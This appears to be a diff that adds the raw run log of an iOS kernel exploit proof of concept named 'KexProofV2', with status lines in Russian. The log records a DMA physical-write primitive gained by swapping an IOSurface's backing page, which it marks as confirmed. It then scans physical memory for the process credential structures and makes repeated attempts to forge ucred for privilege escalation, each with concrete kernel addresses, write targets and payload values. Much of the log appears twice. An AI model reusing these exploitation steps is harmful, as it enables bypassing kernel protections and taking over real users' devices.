+    vmctx+0xe8: 0x0000000000000001
+    vmctx+0xf0: 0x0000000033000000
+    vmctx+0xf8: 0x0000000000420000
+    vmctx+0x100: 0xffffffde0c5d90d0
+    vmctx+0x108: 0xffffffde0c462890
+    vmctx+0x110: 0xffffffedf8c88000
+    vmctx+0x118: 0xffffffee58c88000
+    vmctx+0x120: 0x0001000e00000508
+    vmctx+0x128: 0xffffffde0c86c560
+    vmctx+0x130: 0x0bb8fff04f714170
+    vmctx+0x138: 0x0000000006648000
+    vmctx+0x140: 0x7fffffffffffffff
+    vmctx+0x148: 0x7fffffffffffffff
+    vmctx+0x150: 0x0000000fc0000000
+    vmctx+0x160: 0x0000000000000002
+    vmctx+0x1b0: 0xffffffde0c99d8f0
+    vmctx+0x1b8: 0xffffffdef292aa00
+    vmctx+0x1c0: 0xffffffdef2407260
+    vmctx+0x1c8: 0x0000194000000080
+    vmctx+0x1d8: 0x0000000000000011
+    vmctx+0x1e0: 0x0000000033000000
+    vmctx+0x1e8: 0x0000000000420000
+    vmctx+0x1f0: 0xffffffde0c3baa80
+    vmctx+0x1f8: 0xffffffde0c3baa80
+  [VDB2] маркер-hits по surf-pointees: 0
+    surf+0x8: 0x0000000200000001 (arena?)
+    surf+0x70: 0x0000000001010004
+    surf+0x80: 0x0000000042475241 (arena?)
+    surf+0x3b8: 0x000001eb0005892d (PA?)
+    surf+0x3c8: 0x0000000200000001 (arena?)
+    pd+0x20: 0x0000000000510513
+    pd+0x30: 0x000000000058004e
+    pd+0x88: 0x0000000100000000 (arena?)
+    pd+0xd0: 0x0000000000110063
+  [PH] OWN (owner-MD база) — старт
+  [OWN] A: [pd+0x28]=0xffffffe028713880 [P]=0x1 (signed — не пишем)
+  [OWN] B: [pd+0x90]=0xffffffe10d754250 recs=0xffffffe02813c800 ownerMD=0
+  [PH] RMD (root-MD page-list) — старт
+  [RMD] pd=0xffffffdf4485e3e8 rootMD=0xffffffe10e3e9fe0
+  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора
+  victim#1 async submit (real src): kr=0x0 — mapping кэшируется на pipe
+  [SPC] pd=0xffffffdf4485e3e8 spec([pd+0x60])=0xffffffe10e3e9fe0
+  [SPC] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec+0: 000000000000000000
+    spec+0x8: 0x0000000000080000
+    spec+0x10: 0x0000000483f88000
+    spec+0x18: 0x0000000000100000
+    spec+0x20: 0xffffffedfcc54000
+    spec+0x28: 0x0000000000004000
+    spec+0x30: 0x000000066e8dc000
+    spec+0x38: 0x0000000000100000
+    spec+0x40: 0xffffffedfede4000
+    spec+0x48: 0x0000000000004000
+    spec+0x50: 0x000000066e9dc000
+    spec+0x58: 0x0000000000100000
+  [SPC] fallback: UC=0xffffffdf440cdcd0 pipe=0xffffffe1f38b2400 node=0xffffffe0269c9648
+  [frame-type census] type=0x15 (pa=0x1000b8dbf40)
+  [SPC] spec+0x58 с pfn32 нигде не найден
+  [frame-type census] type=0x6 (pa=0x100057352bc)
+  [OPC-E] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  SCAN B (после execute): скан heap на формы backingPA — сравниваем со SCAN A (create-wired vs execute-wired):
+    hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148 | соседи: 0x0000c04000000020 0x000000040400c147
+    hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000 | соседи: 0x000001000efd0000 0x0000000000004000
+    hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000 | соседи: 0x00000100007bc000 0x0000000000004000
+  измерение: попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  rangesVA=0 — одиночный путь пропускаем, полагаемся на DEP-детектор
+  жду execute victim-опа (backlog ~800 async)…
+  dst пиксели после execute: ненулевых = 1024 — DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)
+  [OPC] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  [DSX] planeDesc=0xffffffdf4485e3e8 type(0x20&0xf0)=0x10
+    dsx entry+0: addr=000000000000000000 len=0x80000 → PA 0
+    dsx entry+0x10: addr=000000000000000000 len=0x20000 → PA 0
+    dsx entry+0x20: addr=0xffffffedfcc54000 len=0x4000 → PA 0x10050500000
+    dsx entry+0x30: addr=0x000000066e8dc000 len=0x100000 → PA 0
+    dsx entry+0x40: addr=0xffffffedfede4000 len=0x4000 → PA 0x100e29e0000
+    dsx entry+0x50: addr=0x000000066e9dc000 len=0x100000 → PA 0
+    dsx entry+0x60: addr=0x000000066eadc000 len=0x100000 → PA 0
+  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)
+  [DSY] rangeObj=0xffffffedf8c908a0 vt(file)=0 (ждём 0x7b33db8)
+  [SPC-post] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec-post+0: 000000000000000000
+    spec-post+0x8: 0x0000000000080000
+    spec-post+0x10: 000000000000000000
+    spec-post+0x18: 0x0000000000020000
+    spec-post+0x20: 0xffffffedfcc54000
+    spec-post+0x28: 0x0000000000004000
+    spec-post+0x30: 0x000000066e8dc000
+    spec-post+0x38: 0x0000000000100000
+    spec-post+0x40: 0xffffffedfede4000
+    spec-post+0x48: 0x0000000000004000
+    spec-post+0x50: 0x000000066e9dc000
+    spec-post+0x58: 0x0000000000100000
+  [RETRY #1] submit kr=0x0 ctl-changed=1024 слот#0=000000000000000000
+      buffer пост-submit: flags=0xc0 entry0=0x000000040405088d entry1=0x000000040400c147 — ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)
+=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (1024 dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===
+  [FORGE] proc_ro=0xffffffdf41f82460 ucred=0xffffffdf41fc87c0 (getuid=501 getgid=501)
+  [FORGE] PAPT сток: tbl=0xfffffff02bd6cc00 n=15
+    stock[0]: 0x00000100082e8000 0xfffffff050000000 0x0000000000076ab8
+  [FORGE] PAPT охота: 11 pointee-кандидатов
+  [FORGE] PAPT найдена @ 0xfffffff02bd6cc00 (fmt=24-B n=15)
+  [FORGE] walker встал на L3 tte=0x1000b8dbf90 — physread через DART
+  [FORGE] leaf PTE = 0x5a5a5a5a5a5a5a5a
+  [PSWAP] p_ucred field: VA=0xffffffdf41f82488 PA=0 (walk deadly — мимо)
+  [PHYSWRITE8v2] target=0x101c86c4000+0 payload=0x0460010142234603 kr=0x0
+  [TBL-TEST] L3[0] нашего proc: readback=000000000000000000 (ждём 0x0460010142234603) → ДРОП (CTRR фенсит и их)
+  [SCAN-Z2] старт: uoff=0x7c0 label=0xc09dffdf41ddacc0 uid=501 roOff=0x2488 ucF=0xffffffdf41fc87c0 frames=0x780b6
+  [SCAN-Z2] скип PA-спаны: SPTM 0x10022af0000..0x10022be4000 TXM 0x10012af0000..0x10012b54000
+  [SCAN-Z2] калибровка из кэша [CAL]: PAPT ✓
+  [SCAN-Z2] whitelist контент-чтений: типы {0x10, 11, 11}, старт idx=0x10000 (PA>=0x10042af0000)
+  [SCAN-Z2] прогресс 0x10000/0x780b6 (чтений 0)
+  [frame-type census] type=0xe (pa=0x10042b10000)
+  [frame-type census] type=0x36 (pa=0x100430f0000)
+  [frame-type census] type=0x35 (pa=0x10043660000)
+  [frame-type census] type=0x18 (pa=0x100437dc000)
+  [frame-type census] type=0x37 (pa=0x10043ecc000)
+  [frame-type census] type=0x34 (pa=0x1004594c000)
+  [frame-type census] type=0x30 (pa=0x10047fc0000)
+  [frame-type census] type=0x17 (pa=0x1005ffe0000)
+  [SCAN-Z2] прогресс 0x18000/0x780b6 (чтений 32768)
+  [frame-type census] type=0x33 (pa=0x10062f1c000)
+  [frame-type census] type=0x31 (pa=0x100630bc000)
+  [frame-type census] type=0x14 (pa=0x10066554000)
+  [frame-type census] type=0x12 (pa=0x1006656c000)
+  [frame-type census] type=0x10 (pa=0x10072c84000)
+  [SCAN-Z2] прогресс 0x20000/0x780b6 (чтений 65536)
+  [SCAN-Z2] ★ proc_ro поле: pa=0x1009c3da488 (p_ucred==ucF + соседи) [тип кадра=24] — PSWAP-B вооружён
+  [SCAN-Z2] прогресс 0x28000/0x780b6 (чтений 98304)
+  [SCAN-Z2] прогресс 0x30000/0x780b6 (чтений 131072)
+  [SCAN-Z2] прогресс 0x38000/0x780b6 (чтений 163840)
+  [SCAN-Z2] прогресс 0x40000/0x780b6 (чтений 196608)
+  [SCAN-Z2] прогресс 0x48000/0x780b6 (чтений 229376)
+  [SCAN-Z2] прогресс 0x50000/0x780b6 (чтений 262144)
+  [frame-type census] type=0x32 (pa=0x10156278000)
+  [SCAN-Z2] прогресс 0x58000/0x780b6 (чтений 294912)
+  [SCAN-Z2] ucred-кандидат pa=0x10166614000: label+uid сошлись, live-сверка — мимо (расхождение @+0)
+  [SCAN-Z2] образец чужого ucred сохранён: pa=0x10166614000 (тип 24) — VMPROBE будет
+  [frame-type census] type=0x2f (pa=0x1017f9cc000)
+  [frame-type census] type=0x38 (pa=0x1017f9d0000)
+  [SCAN-Z2] прогресс 0x60000/0x780b6 (чтений 327680)
+  [SCAN-Z2] прогресс 0x68000/0x780b6 (чтений 360448)
+  [SCAN-Z2] прогресс 0x70000/0x780b6 (чтений 393216)
+  [SCAN-Z2] прогресс 0x78000/0x780b6 (чтений 425984)
+  [SCAN-Z2] финиш: кадров=0x780b6 чтений=426166 ucredPA=0 roFieldPA=0x1009c3da488 — ЦЕЛЬ НАЙДЕНА ★
+  [SCAN-Z2] гистограмма типов (кадров 491702, нет-таблицы 0): 11:338418 14:70625 16:11 17:384 18:1 19:6526 20:5 23:89 24:44 33:9171 47:1 48:9 49:7 50:2 51:8 52:9 53:21 54:40 55:794 56:1
+  [SCAN-Z2-BAND] kernel-проход 256MB..1GB (whitelist + 0x37)
+  [SCAN-Z2-BAND] прогресс 0x4000 (чтений 1)
+  [SCAN-Z2-BAND] прогресс 0x6000 (чтений 8193)
+  [frame-type census] type=0x2e (pa=0x1001f36c000)
+  [SCAN-Z2-BAND] прогресс 0x8000 (чтений 16385)
+  [SCAN-Z2-BAND] прогресс 0xa000 (чтений 24577)
+  [SCAN-Z2-BAND] прогресс 0xc000 (чтений 32769)
+  [SCAN-Z2-BAND] прогресс 0xe000 (чтений 40961)
+  [SCAN-Z2-BAND] финиш: чтений=49152 ucredPA=0 roFieldPA=0x1009c3da488
+  [T18-ENUM] перебор кадров типа 24 из frame table (наш ucred — в зоне этого типа)
+  [frame-type census] type=0x27 (pa=0x10004410000)
+  [frame-type census] type=0x5 (pa=0x10004428000)
+  [frame-type census] type=0x3 (pa=0x10007c00000)
+  [frame-type census] type=0x4 (pa=0x10007d10000)
+  [frame-type census] type=0x2 (pa=0x10007d64000)
+  [frame-type census] type=0x28 (pa=0x10007da4000)
+  [frame-type census] type=0x1 (pa=0x100095dc000)
+  [frame-type census] type=0x29 (pa=0x100095f0000)
+  [frame-type census] type=0x2a (pa=0x100096b4000)
+  [frame-type census] type=0xa (pa=0x100096fc000)
+  [frame-type census] type=0x39 (pa=0x10009784000)
+  [frame-type census] type=0x2c (pa=0x1000978c000)
+  [frame-type census] type=0x2b (pa=0x100097ac000)
+  [frame-type census] type=0x3a (pa=0x100097b0000)
+  [frame-type census] type=0x16 (pa=0x1000bef4000)
+  [frame-type census] type=0x1c (pa=0x1000bff8000)
+  [frame-type census] type=0x1b (pa=0x1000bffc000)
+  [T18-ENUM] кадров типа 24: всего 99, высоких 57, низких 16
+  [T18-ENUM] низкий кандидат[0] pa=0x1000b8d0000
+  [T18-ENUM] низкий кандидат[1] pa=0x1000b8dc000
+  [T18-ENUM] низкий кандидат[2] pa=0x1000bc34000
+  [T18-ENUM] низкий кандидат[3] pa=0x1000bc48000
+  [T18-ENUM] низкий кандидат[4] pa=0x1000bf38000
+  [T18-ENUM] низкий кандидат[5] pa=0x1000bf3c000
+  [T18-ENUM] низкий кандидат[6] pa=0x1000bf40000
+  [T18-ENUM] низкий кандидат[7] pa=0x1000bf48000
+  [T18-ENUM] низкий кандидат[8] pa=0x1000bf4c000
+  [T18-ENUM] низкий кандидат[9] pa=0x1000bf50000
+  [T18-ENUM] низкий кандидат[10] pa=0x1000bf60000
+  [T18-ENUM] низкий кандидат[11] pa=0x1000bf64000
+  [T18-ENUM] низкий кандидат[12] pa=0x1000bf68000
+  [T18-ENUM] низкий кандидат[13] pa=0x1000bf6c000
+  [T18-ENUM] низкий кандидат[14] pa=0x1000bf70000
+  [T18-ENUM] низкий кандидат[15] pa=0x1000bf74000
+  [T18-ENUM] низких 16 — пробуем первый pa=0x1000b8d0000 (список выше для добора)
+  [PSWAP-B] KVA-верификация маркером: papt=✓ linear=✗ → KVA=0xfffffff1609a4000
+  [PSWAP-B] forge page: PA=0x10118c8c000 KVA=0xfffffff1609a4000 → поле 0x1009c3da488
+  [PHYSWRITE8v2] target=0x1009c3d8000+0x2488 payload=0xfffffff1609a4000 kr=0x0
+  [PSWAP-B] запись=kr=0 readback=0xffffffdf41fc87c0 (ждём 0xfffffff1609a4000) → НЕ ПРИЛИПЛО
+  [FORGE] валидация ПРОПУЩЕНА (VMPROBE-on-faith) — INPL пишет и проверяет через readback
+  [FORGE] pageVA=0xffffffdf41fc8000 pagePA=0x1000b8d0000 uoff=0x7c0 — валидация PA: СОШЛАСЬ
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [INPL] physwrite8: 00000 | readback cr_uid=501 groups0=501 cr_label=0xc09dffdf41ddacc0 | getuid()=501 getgid()=501
+  [INPL] не прилипло — откат не нужен (контент не изменился), иду в тяжёлый форж
+  [FORGE] DEP-хиты перепатчены на ucredPFN (1 шт)
+  [FORGE] victim#2 submit (ucredPA, fresh pipe): kr=0x0 — жду DMA в ucred
+  [FORGE] getuid()=501 getgid()=501 | cr_uid=501 cr_label=0xc09dffdf41ddacc0
+Отчёт записан: /var/mobile/Containers/Data/Application/2816C38E-BBD4-4701-A3EF-7B77A8C6399B/Documents/kexproof-paswap.txt
+
+
+========== FILE: kexproof-paswap.txt (50897 байт, mtime=2026-10-06 05:35:59 +0000) ==========
+=== IOSurface backing-PA swap: physwrite через DMA ===
+  [DCPAV] DCPAVControllerProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVDeviceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVServiceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVVideoInterfaceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVAudioInterfaceProxy: сервис НЕ найден
+  surfaces: srcID=15 dstID=12 (подменяем backing у dst)
+  процесс "KexProofV2" (p_name="KexProofV2") @ 0xffffffe2d77dd660 (узлов=0)
+  контрольная страница: VA=0x1017dc000 PA=0x10142234000 (заполнена 0xCC)
+  [CAL] physmap-алиасы (рано, маркер жив): linear=0xaa0103f9 papt=0xcafebabe → PAPT ✓
+  ctlPA валидация: phystokv(0x10142234000)=0xcafebabe → ВЕРНО
+  backing PA dst = 0x10030520000 (vtophys пикселей VA=0x10450c000), маркер по phystokv: 0x41544159 → ПОДТВЕРЖДЁН
+  SCAN A (после create, до churn/submit):
+  frame table: raw=0xfffffff05078c000 → VA 0xfffffff05078c000
+    [A] hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148
+    [A] hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000
+    [A] hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000
+  [A] попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  isTable=0xffffffed0cd8c000 (звенья: proc_ro=0xffffffdf41f82460 task=0xffffffe2d77ddda0 itk=0xd1e6ffe027ed2728)
+  ip_kobject oracle: task port VA=0xffffffe10b4aec50 selfTask=0xffffffe2d77ddda0 → ip_kobject @ +0x48 (статика +0x48)
+  порт-маршрут: smp=0x347e77 kobj=0xffffffe028843120 vt=0xfffffff04c797d68 (file 0xfffffff007b03d68; SendRight ждём 0xfffffff04cb834c8)
+    kobj+0x00: raw=0x128b7ff04c797d68 untag=0xfffffff04c797d68 → [+0x10]=0x4d297234 surfFast=0
+    kobj+0x08: raw=0x0000000100000001 untag=0x0000000100000001
+    kobj+0x10: raw=0x0000010122000000 untag=0x0000010122000000
+    kobj+0x18: raw=000000000000000000 untag=000000000000000000
+    kobj+0x20: raw=0xffffffe028840c60 untag=0xffffffe028840c60 → [+0x10]=0x22000000 surfFast=0
+    kobj+0x28: raw=0xffffffe10864e860 untag=0xffffffe10864e860 → [+0x10]=0 surfFast=0
+    kobj+0x30: raw=0x52c47fe2d9864fa0 untag=0xffffffe2d9864fa0 → [+0x10]=0xf41ec400 surfFast=0
+    IOMachPort: fPort=0xffffffe10864e860 kotype=0x1b fObject=0xffffffe2d9864fa0 vt=0xfffffff04cb834c8 (file 0xfffffff007eef4c8 = SendRight!)
+    SendRight ✓: owner(Root)=0xffffffe1f41ec400 IOSurface=0xffffffe10e25ad40 ([surf+0x10]=0xc ждём 12) surfFast=0
+  ★ smp IOMachPort-хоп → IOSurface 0xffffffe10e25ad40
+  ★ порт-маршрут дал surfVA=0xffffffe10e25ad40 — слоты/подмена ДО submit
+  IOSurface 0xffffffe10e25ad40: rangeObj(+0x178)=0xffffffedf8c908a0 plane(+0x30)=0xffffffdf4485e3e8 ranges(+0x360)=0 rangeCount(+0x3a4)=0
+  planeDesc vtable: 0xfffffff04c7c7db8 (file 0xfffffff007b33db8) — класс IOMD
+    IOMD lvl0: md=0xffffffdf4485e3e8 [+0x60]=0xffffffe10e3e9fe0 count=1 [0]=000000000000000000 [8]=0x0000000000080000
+    pd+0000: 0x44a67ff04c7c7db8
+    pd+0x08: 0x0000000000010002
+    pd+0x10: 0xffffffe0264f9300
+    pd+0x18: 0xffffffe1f3b0b580
+    pd+0x20: 0x0000000000510513
+    pd+0x28: 0xffffffe028713880
+    pd+0x30: 0x000000000058004e
+    pd+0x38: 000000000000000000
+    pd+0x40: 000000000000000000
+    pd+0x48: 000000000000000000
+    pd+0x50: 0x0000000000080000
+    pd+0x58: 000000000000000000
+    pd+0x60: 0xffffffe10e3e9fe0
+    pd+0x68: 0x0000000000000001
+    pd+0x70: 0xffffffe2d9a801e0
+    pd+0x78: 000000000000000000
+    pd+0x80: 000000000000000000
+    pd+0x88: 0x0000000100000000
+    pd+0x90: 0xffffffe10d754250
+    pd+0x98: 0x0406e1fe00000020
+    pd+0xa0: 000000000000000000
+    pd+0xa8: 0xffffffe2da0d4b70
+    pd+0xb0: 000000000000000000
+    pd+0xb8: 000000000000000000
+    pd+0xc0: 0x0000000000080000
+    pd+0xc8: 0x0000000000004000
+    pd+0xd0: 0x0000000000110063
+    pd+0xd8: 000000000000000000
+    pd+0xe0: 0x0000000000000008
+    pd+0xe8: 0xdea87ff04c7c7db8
+    pd+0xf0: 0x0000000000010004
+    pd+0xf8: 0xffffffe0264faf20
+  IOSurface найден, но pfn-слотов нет — уходим в старые пути
+  [CHAIN-S] srcVA=0xffffffe10e25b100 pd=0xffffffdf4484f520 type=0x10 buf=0xffffffe02813cc80 count=0x20 entry0=0x000000040400ae68 — маркеры сошлись (physread вооружён)
+  [CHAIN] pd=0xffffffdf4485e3e8 vt=0xfffffff04c7c7db8 type=0x10 hdr=0xffffffe10d754250 buf=0xffffffe02813c800 count=0x20 flags=0xc0 — маркеры сошлись, патчим entries
+  [CHAIN] ★ entry[0] @ 0xffffffe02813c830: 0x000000040400c148 → ctlPFN 0x405088d (зона: не зона/VM)
+      readback: 0x000000040405088d — ПРИЛИПЛО
+  [PH] VAD (VA-field deputy) — старт
+  [VAD] VA-поле не найдено (пулов=15, полей проверено=66, physmap-скип=60) — следующий шаг: pv_head/второй уровень
+  [PH] PAR (parent-ranges) — старт
+  [PAR] parentMD=0xffffffe10e3e9fe0 arr=0x66eadc000 count=32768
+  [VDB] [planeDesc+0xb8] = 000000000000000000 (ноль — ranges-based)
+  [VDB] vmctx [0x7b33f28]=0xffffffde0c3ba890 (sym 0xfffffff04c7c7f28)
+    vmctx+0: 0x0000000033000000
+    vmctx+0x8: 0x0000000000420000
+    vmctx+0x10: 0xffffffde0c3beed0
+    vmctx+0x18: 0xffffffde0c3bfdd0
+    vmctx+0x20: 0xffffffdc00000000
+    vmctx+0x28: 0xfffffffbffffffff
+    vmctx+0x30: 0x0000000e00000883
+    vmctx+0x38: 0xffffffde0c452d60
+    vmctx+0x40: 0x6ed17ff04f714170
+    vmctx+0x48: 0x00000014c5988000
+    vmctx+0x50: 0x7fffffffffffffff
+    vmctx+0x58: 0x7fffffffffffffff
+    vmctx+0x60: 0x0000000fc0000000
+    vmctx+0x70: 0x00000000000007c7
+    vmctx+0xc0: 0xffffffde0caf04a0
+    vmctx+0xc8: 0xffffffdef292dac0
+    vmctx+0xd0: 0xffffffde0c3c14e0
+    vmctx+0xd8: 0x000f47b900000080
+    vmctx+0xe8: 0x0000000000000001
+    vmctx+0xf0: 0x0000000033000000
+    vmctx+0xf8: 0x0000000000420000
+    vmctx+0x100: 0xffffffde0c5d90d0
+    vmctx+0x108: 0xffffffde0c462890
+    vmctx+0x110: 0xffffffedf8c88000
+    vmctx+0x118: 0xffffffee58c88000
+    vmctx+0x120: 0x0001000e00000508
+    vmctx+0x128: 0xffffffde0c86c560
+    vmctx+0x130: 0x0bb8fff04f714170
+    vmctx+0x138: 0x0000000006648000
+    vmctx+0x140: 0x7fffffffffffffff
+    vmctx+0x148: 0x7fffffffffffffff
+    vmctx+0x150: 0x0000000fc0000000
+    vmctx+0x160: 0x0000000000000002
+    vmctx+0x1b0: 0xffffffde0c99d8f0
+    vmctx+0x1b8: 0xffffffdef292aa00
+    vmctx+0x1c0: 0xffffffdef2407260
+    vmctx+0x1c8: 0x0000194000000080
+    vmctx+0x1d8: 0x0000000000000011
+    vmctx+0x1e0: 0x0000000033000000
+    vmctx+0x1e8: 0x0000000000420000
+    vmctx+0x1f0: 0xffffffde0c3baa80
+    vmctx+0x1f8: 0xffffffde0c3baa80
+  [VDB2] маркер-hits по surf-pointees: 0
+    surf+0x8: 0x0000000200000001 (arena?)
+    surf+0x70: 0x0000000001010004
+    surf+0x80: 0x0000000042475241 (arena?)
+    surf+0x3b8: 0x000001eb0005892d (PA?)
+    surf+0x3c8: 0x0000000200000001 (arena?)
+    pd+0x20: 0x0000000000510513
+    pd+0x30: 0x000000000058004e
+    pd+0x88: 0x0000000100000000 (arena?)
+    pd+0xd0: 0x0000000000110063
+  [PH] OWN (owner-MD база) — старт
+  [OWN] A: [pd+0x28]=0xffffffe028713880 [P]=0x1 (signed — не пишем)
+  [OWN] B: [pd+0x90]=0xffffffe10d754250 recs=0xffffffe02813c800 ownerMD=0
+  [PH] RMD (root-MD page-list) — старт
+  [RMD] pd=0xffffffdf4485e3e8 rootMD=0xffffffe10e3e9fe0
+  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора
+  victim#1 async submit (real src): kr=0x0 — mapping кэшируется на pipe
+  [SPC] pd=0xffffffdf4485e3e8 spec([pd+0x60])=0xffffffe10e3e9fe0
+  [SPC] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec+0: 000000000000000000
+    spec+0x8: 0x0000000000080000
+    spec+0x10: 0x0000000483f88000
+    spec+0x18: 0x0000000000100000
+    spec+0x20: 0xffffffedfcc54000
+    spec+0x28: 0x0000000000004000
+    spec+0x30: 0x000000066e8dc000
+    spec+0x38: 0x0000000000100000
+    spec+0x40: 0xffffffedfede4000
+    spec+0x48: 0x0000000000004000
+    spec+0x50: 0x000000066e9dc000
+    spec+0x58: 0x0000000000100000
+  [SPC] fallback: UC=0xffffffdf440cdcd0 pipe=0xffffffe1f38b2400 node=0xffffffe0269c9648
+  [SPC] spec+0x58 с pfn32 нигде не найден
+  [OPC-E] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  SCAN B (после execute): скан heap на формы backingPA — сравниваем со SCAN A (create-wired vs execute-wired):
+    hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148 | соседи: 0x0000c04000000020 0x000000040400c147
+    hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000 | соседи: 0x000001000efd0000 0x0000000000004000
+    hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000 | соседи: 0x00000100007bc000 0x0000000000004000
+  измерение: попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  rangesVA=0 — одиночный путь пропускаем, полагаемся на DEP-детектор
+  жду execute victim-опа (backlog ~800 async)…
+  dst пиксели после execute: ненулевых = 1024 — DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)
+  [OPC] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  [DSX] planeDesc=0xffffffdf4485e3e8 type(0x20&0xf0)=0x10
+    dsx entry+0: addr=000000000000000000 len=0x80000 → PA 0
+    dsx entry+0x10: addr=000000000000000000 len=0x20000 → PA 0
+    dsx entry+0x20: addr=0xffffffedfcc54000 len=0x4000 → PA 0x10050500000
+    dsx entry+0x30: addr=0x000000066e8dc000 len=0x100000 → PA 0
+    dsx entry+0x40: addr=0xffffffedfede4000 len=0x4000 → PA 0x100e29e0000
+    dsx entry+0x50: addr=0x000000066e9dc000 len=0x100000 → PA 0
+    dsx entry+0x60: addr=0x000000066eadc000 len=0x100000 → PA 0
+  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)
+  [DSY] rangeObj=0xffffffedf8c908a0 vt(file)=0 (ждём 0x7b33db8)
+  [SPC-post] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec-post+0: 000000000000000000
+    spec-post+0x8: 0x0000000000080000
+    spec-post+0x10: 000000000000000000
+    spec-post+0x18: 0x0000000000020000
+    spec-post+0x20: 0xffffffedfcc54000
+    spec-post+0x28: 0x0000000000004000
+    spec-post+0x30: 0x000000066e8dc000
+    spec-post+0x38: 0x0000000000100000
+    spec-post+0x40: 0xffffffedfede4000
+    spec-post+0x48: 0x0000000000004000
+    spec-post+0x50: 0x000000066e9dc000
+    spec-post+0x58: 0x0000000000100000
+  [RETRY #1] submit kr=0x0 ctl-changed=1024 слот#0=000000000000000000
+      buffer пост-submit: flags=0xc0 entry0=0x000000040405088d entry1=0x000000040400c147 — ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)
+=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (1024 dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===
+  [FORGE] proc_ro=0xffffffdf41f82460 ucred=0xffffffdf41fc87c0 (getuid=501 getgid=501)
+  [FORGE] PAPT сток: tbl=0xfffffff02bd6cc00 n=15
+    stock[0]: 0x00000100082e8000 0xfffffff050000000 0x0000000000076ab8
+  [FORGE] PAPT охота: 11 pointee-кандидатов
+  [FORGE] PAPT найдена @ 0xfffffff02bd6cc00 (fmt=24-B n=15)
+  [FORGE] walker встал на L3 tte=0x1000b8dbf90 — physread через DART
+  [FORGE] leaf PTE = 0x5a5a5a5a5a5a5a5a
+  [PSWAP] p_ucred field: VA=0xffffffdf41f82488 PA=0 (walk deadly — мимо)
+  [PHYSWRITE8v2] target=0x101c86c4000+0 payload=0x0460010142234603 kr=0x0
+  [TBL-TEST] L3[0] нашего proc: readback=000000000000000000 (ждём 0x0460010142234603) → ДРОП (CTRR фенсит и их)
+  [SCAN-Z2] старт: uoff=0x7c0 label=0xc09dffdf41ddacc0 uid=501 roOff=0x2488 ucF=0xffffffdf41fc87c0 frames=0x780b6
+  [SCAN-Z2] скип PA-спаны: SPTM 0x10022af0000..0x10022be4000 TXM 0x10012af0000..0x10012b54000
+  [SCAN-Z2] калибровка из кэша [CAL]: PAPT ✓
+  [SCAN-Z2] whitelist контент-чтений: типы {0x10, 11, 11}, старт idx=0x10000 (PA>=0x10042af0000)
+  [SCAN-Z2] прогресс 0x10000/0x780b6 (чтений 0)
+  [SCAN-Z2] прогресс 0x18000/0x780b6 (чтений 32768)
+  [SCAN-Z2] прогресс 0x20000/0x780b6 (чтений 65536)
+  [SCAN-Z2] ★ proc_ro поле: pa=0x1009c3da488 (p_ucred==ucF + соседи) [тип кадра=24] — PSWAP-B вооружён
+  [SCAN-Z2] прогресс 0x28000/0x780b6 (чтений 98304)
+  [SCAN-Z2] прогресс 0x30000/0x780b6 (чтений 131072)
+  [SCAN-Z2] прогресс 0x38000/0x780b6 (чтений 163840)
+  [SCAN-Z2] прогресс 0x40000/0x780b6 (чтений 196608)
+  [SCAN-Z2] прогресс 0x48000/0x780b6 (чтений 229376)
